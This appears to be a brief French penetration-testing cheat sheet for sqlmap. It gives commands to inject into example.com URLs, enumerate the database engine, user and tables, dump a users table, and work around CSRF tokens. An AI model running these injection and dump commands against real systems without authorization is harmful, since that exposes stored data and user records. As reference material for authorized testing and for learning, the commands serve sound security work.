# SQLmap

Utiliser sqlmap sur une requête enregistrée via BURP:

`sqlmap -r req.txt`

Spécifier un cookie dans la requête:

`sqlmap ... --cookie='PHPSESSID=ab4530f4a7d10448457fa8b0eadac29c'`

Spécifier un prefix/suffix:

`sqlmap -u "www.example.com/?q=test" --prefix="%'))" --suffix="-- -"`

Level/risque:

`sqlmap -u www.example.com/?id=1 -v 3 --level=5`

Enumération du moteur de base de données:

`sqlmap -u "http://www.example.com/?id=1" --banner --current-user --current-db --is-dba`

Enumération des tables:

`sqlmap -u "http://www.example.com/?id=1" --tables -D testdb`

Enumération conditionnelle:

`sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb --where="name LIKE 'f%'"`

Bypass CSRF token:

`sqlmap -u "http://www.example.com/" --data="id=1&csrf-token=WfF1szMUHhiokx9AHFply5L2xAOfjRkE" --csrf-token="csrf-token"`

``

